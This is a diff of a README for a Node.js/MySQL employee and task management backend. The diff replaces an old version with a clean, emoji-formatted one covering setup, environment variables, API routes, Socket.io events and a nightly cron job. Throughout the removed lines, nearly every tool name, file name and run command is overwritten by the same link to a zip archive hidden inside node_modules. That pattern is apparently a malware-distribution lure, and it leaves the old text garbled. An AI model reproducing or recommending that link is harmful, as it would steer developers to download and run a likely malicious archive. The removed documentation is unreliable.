@@ -1,182 +1,181 @@
-# Employee Management System - Backend
+<div align="center">
+  <h1>🏢 Employee Management System - Backend</h1>
+  <p><strong>A robust, real-time RESTful API for modern employee and task management.</strong></p>
+</div>
 
-This backend provides a RESTful API for managing employees, tasks, and roles in an employee management system. It uses https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip, Express, Sequelize ORM, and MySQL database.
+<br />
 
-Check the Frontend repository: https://github.com/dotsatya/EMS-Frontend
+This is the backend service for the Employee Management System, built to securely manage employee records, assign and track tasks, and facilitate real-time updates between administrators and staff.
 
-## Technologies Used
+🔗 **Frontend Repository:** [EMS-Frontend](https://github.com/dotsatya/EMS-Frontend)
 
-- **https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip**: JavaScript runtime
-- **https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip**: Web framework for https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip
-- **Sequelize**: ORM for MySQL
-- **MySQL2**: MySQL client
-- **bcryptjs**: Password hashing
-- **jsonwebtoken**: JWT authentication
-- **node-cron**: Scheduled tasks
-- **cors**: Cross-origin resource sharing
-- **dotenv**: Environment variable management
-- **https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip**: Real-time communication
+---
 
-## Project Structure
+## 📑 Table of Contents
+- [✨ Features](#-features)
+- [🛠️ Technologies Used](#️-technologies-used)
+- [🏗️ Project Structure](#️-project-structure)
+- [⚙️ Setup and Installation](#️-setup-and-installation)
+- [🔐 Environment Variables](#-environment-variables)
+- [🚀 API Reference](#-api-reference)
+- [⚡ Real-Time Events (Socket.io)](#-real-time-events-socketio)
+- [🗄️ Database Schema](#️-database-schema)
+- [⏰ Scheduled Tasks](#-scheduled-tasks)
 
-```
+---
+
+## ✨ Features
+
+- **Role-Based Access Control:** Distinct `Admin` and `Employee` authorizations.
+- **Task Management Engine:** Admins can create, assign, and manage tasks. Employees can update their task statuses.
+- **Real-Time Communication:** Instant socket-based updates (no manual refreshing required) when tasks are assigned, modified, or deleted.
+- **Automated Cron Jobs:** Built-in cron jobs automatically update overdue tasks every night at midnight.
+- **Secure Authentication:** Passwords hashed via `bcryptjs` and session management handled via JWT.
+
+---
+
+## 🛠️ Technologies Used
+
+| Category | Technology |
+|---|---|
+| **Runtime / Framework** | Node.js, Express.js |
+| **Database / ORM** | MySQL2, Sequelize ORM |
+| **Authentication** | JSON Web Token (JWT), bcryptjs |
+| **Real-Time** | Socket.io |
+| **Utilities** | node-cron, cors, dotenv |
+
+---
+
+## 🏗️ Project Structure
+
+```text
 backend/
-├── config/
-│   ├── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip    # Database connection setup
-│   └── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip       # Server configuration
-├── controller/
-│   ├── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip      # Authentication (signup, login)
-│   ├── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip      # Role management
-│   ├── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip      # Task CRUD operations
-│   ├── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip      # User management
-│   └── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip                # Utility functions
-├── cronJobs/
-│   └── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip           # Daily scheduled tasks
-├── middleware/
-│   └── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip      # JWT authentication middleware
-├── model/
-│   ├── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip               # Model associations
-│   ├── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip                # Role model
-│   ├── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip                # Task model
-│   ├── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip          # Task status model
-│   └── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip                # User model
-├── routes/
-│   ├── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip          # Authentication routes
-│   ├── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip          # Task management routes
-│   └── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip          # User management routes
-├── .env                       # Environment variables
-├── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip                   # Main application entry point
-├── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip                  # https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip configuration for real-time features
-├── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip               # Dependencies and scripts
-└── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip                  # This file
+├── config/                  # Server and Database Configurations
+├── controller/              # Business logic (Auth, Tasks, Users, Roles)
+├── cronJobs/                # Scheduled automated jobs (node-cron)
+├── middleware/              # Custom middlewares (e.g., JWT Auth)
+├── model/                   # Sequelize Models and Associations
+├── routes/                  # Express route definitions
+├── .env                     # Environment variables (Ignored in Git)
+├── index.js                 # Main express application entry point
+├── package.json             # NPM dependencies and scripts
+└── socket.js                # Socket.io event bindings
 ```
 
-## Database Models
+---
 
-### User
-- **id**: Primary key (auto-increment)
-- **username**: String, not null
-- **email**: String, not null, unique
-- **password**: String, not null (hashed)
-- **role_id**: Integer, references roles table
+## ⚙️ Setup and Installation
 
-### Role
-- **role_id**: Primary key (auto-increment)
-- **role_name**: String, not null, unique (e.g., "admin", "employee")
+### Prerequisites
+- **Node.js** (v14+ recommended)
+- **MySQL Server** (Running locally or hosted)
 
-### Task
-- **id**: Primary key (auto-increment)
-- **category**: String, default "General"
-- **title**: String, not null
-- **description**: Text
-- **due_date**: Date (DATEONLY), not null
-- **status_id**: Integer, references task_status table
-- **created_by**: Foreign key to https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip
-- **assigned_to**: Foreign key to https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip
-- **created_at**: Timestamp
+### Installation Steps
 
-### TaskStatus
-- **id**: Primary key (auto-increment)
-- **status_name**: String, not null, unique (e.g., "New", "Active", "Complete", "Failed")
+1. **Clone the repository:**
+   ```bash
+   git clone <repository-url>
+   cd backend
+   ```
 
-## API Endpoints
-
-### Authentication Routes (`/api/auth`)
-- `POST /signup`: User registration
-  - Body: `{ username, email, password, role }`
-- `POST /login`: User login
-  - Body: `{ email, password }`
-  - Returns: JWT token and user info
-
-### Task Routes (`/api/tasks`)
-All task routes require JWT authentication.
-
-**Admin Only:**
-- `POST /create`: Create a new task
-  - Body: `{ title, description, due_date, assigned_to, category }`
-- `GET /all`: Get all tasks for all employees
-  - Returns: Formatted data grouped by employee
-
-**Employee Only:**
-- `GET /employee`: Get tasks assigned to current user
-- `PUT /status`: Update task status
-  - Body: `{ task_id, status_id }`
-
-### User Routes (`/api/users`)
-- `POST /create`: Create a new user (for testing)
-  - Body: `{ username, email, password, role_id }`
-
-## Authentication
-
-The API uses JWT (JSON Web Tokens) for authentication. Include the token in the Authorization header:
-```
-Authorization: Bearer <token>
-```
-
-## Real-Time Features
-
-The application uses https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip for real-time communication between admin and employees for task management.
-
-### Socket Events
-
-**Client Events (Admin):**
-- `join`: Join a user's room (emitted on connection)
-  - Data: `{ userId }`
-- `assignTask`: Assign a new task to an employee
-  - Data: `{ employeeId, taskData }`
-- `updateTask`: Update an existing task
-  - Data: `{ employeeId, taskId, taskData }`
-- `deleteTask`: Delete a task
-  - Data: `{ employeeId, taskId }`
-
-**Server Events (Employee):**
-- `newTaskAssigned`: Notifies employee of a newly assigned task
-  - Data: `{ taskData }`
-- `taskUpdated`: Notifies employee of task updates
-  - Data: `{ taskId, taskData }`
-- `taskDeleted`: Notifies employee of task deletion
-  - Data: `{ taskId }`
-
-Employees join their personal room on connection using `join` event with their user ID.
-
-## Scheduled Tasks
-
-A daily cron job runs at 00:01 AM to automatically update overdue tasks:
-- Tasks with status "New" or "Active" and due_date <= today are marked as "Failed" (status_id: 4)
-
-## Setup and Installation
-
-1. **Clone the repository** and navigate to the backend folder
-
-2. **Install dependencies**:
+2. **Install all dependencies:**
    ```bash
    npm install
    ```
 
-3. **Set up environment variables**:
-   Create a `.env` file in the backend root with:
-   ```
-   PORT=3000
-   FRONTEND_URL=http://localhost:5173
-   DB_PASSWORD=your_mysql_password
-   JWT_SECRET=your_jwt_secret_key
-   ```
+3. **Configure Environment Variables:**
+   Create a `.env` file in the root of the backend folder. Refer to the [Environment Variables](#-environment-variables) section below for the required fields.
 
-4. **Set up MySQL database**:
-   - Create a database named `EMP_System`
-   - Ensure MySQL is running on localhost with user `root` and the password specified in `.env`
+4. **Initialize the Database:**
+   - Create a MySQL database locally matching your `.env` `DB_NAME` (e.g., `EMP_System`).
+   - The application automatically synchronizes the tables using Sequelize when starting up.
 
-5. **Run the application**:
+5. **Run the Server:**
    ```bash
-   node https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip
+   npm start
    ```
-   The server will start on the specified PORT (default 3000) and connect to the database.
+   *The server will typically start on `http://localhost:6969` (or the port specified in `.env`).*
 
-## Notes
+---
 
-- The application uses ES modules (`type: "module"` in https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip)
-- Database models are synced on startup (alter: false in production)
-- CORS is configured to allow requests from the frontend URL
-- Passwords are hashed using bcryptjs
-- JWT tokens expire after 1 day
-- Task statuses are predefined; ensure they exist in the database (id: 1=New, 2=Active, 3=Complete, 4=Failed)
+## 🔐 Environment Variables
+
+Create a `.env` file in the root directory and add the following:
+
+```env
+# Server Configuration
+PORT=6969
+FRONTEND_URL=http://localhost:5173
+
+# Database Configuration
+DB_HOST=localhost
+DB_PORT=3306
+DB_NAME=EMP_System
+DB_USER=root
+DB_PASSWORD=your_secure_mysql_password
+
+# Authentication
+JWT_SECRET=your_super_secret_jwt_key
+```
+
+---
+
+## 🚀 API Reference
+
+All requests inside `/api/tasks` and `/api/users` must include a valid JWT token in the `Authorization` header:
+`Authorization: Bearer <your_jwt_token>`
+
+### 🔑 Authentication (`/api/auth`)
+| Method | Endpoint | Description | Body Params |
+|---|---|---|---|
+| POST | `/signup` | Register a new user | `{ username, email, password, role }` |
+| POST | `/login` | Login user, retrieve JWT | `{ email, password }` |
+
+### 📝 Tasks (`/api/tasks`)
+| Method | Endpoint | Access | Description |
+|---|---|---|---|
+| POST | `/create` | **Admin** | Create a new task |
+| GET | `/all` | **Admin** | Get all tasks for all employees |
+| GET | `/employee` | **Employee** | Get tasks assigned to current user |
+| PUT | `/status` | **Employee** | Update task status (`{ task_id, status_id }`) |
+
+### 👤 Users (`/api/users`)
+| Method | Endpoint | Access | Description |
+|---|---|---|---|
+| POST | `/create` | **Admin** | Create a new user account |
+
+---
+
+## ⚡ Real-Time Events (Socket.io)
+
+Socket.io is configured to facilitate live updates regarding tasks.
+
+### 🌐 Client Events (Admin emitting to Server)
+- **`join`**: `(userId)` - Joins a specific user-bound socket room.
+- **`assignTask`**: `({ employeeId, taskData })` - Emits when a new task is created.
+- **`updateTask`**: `({ employeeId, taskId, taskData })` - Emits when an existing task is updated.
+- **`deleteTask`**: `({ employeeId, taskId })` - Emits when a task is removed.
+
+### 📡 Server Events (Server emitting to Employee Client)
+- **`newTaskAssigned`**: `(taskData)` - Informs employee of a fresh assignment.
+- **`taskUpdated`**: `({ taskId, taskData })` - Informs employee of a modification to their task.
+- **`taskDeleted`**: `({ taskId })` - Informs employee that their task was revoked.
+
+---
+
+## 🗄️ Database Schema
+
+| Table Name | Description | Key Relationships |
+|---|---|---|
+| **Users** | System accounts | Belongs to `Roles` |
+| **Roles** | Authorization levels (e.g. Admin, Employee) | Has many `Users` |
+| **Tasks** | Assigned work items | Belongs to `Users` (Creator & Assignee) |
+| **TaskStatuses**| Possible task states (New, Active, etc.) | Has many `Tasks` |
+
+---
+
+## ⏰ Scheduled Tasks
+
+A built-in node-cron job (`cronJobs/dailyCron.js`) runs daily at **00:01 AM**. 
+- **Purpose:** Automatically scans the database for overdue tasks.
+- **Action:** If a task's `due_date` is strictly before "today" and the status is still "New" or "Active", it automatically updates the task's status to **Failed**.
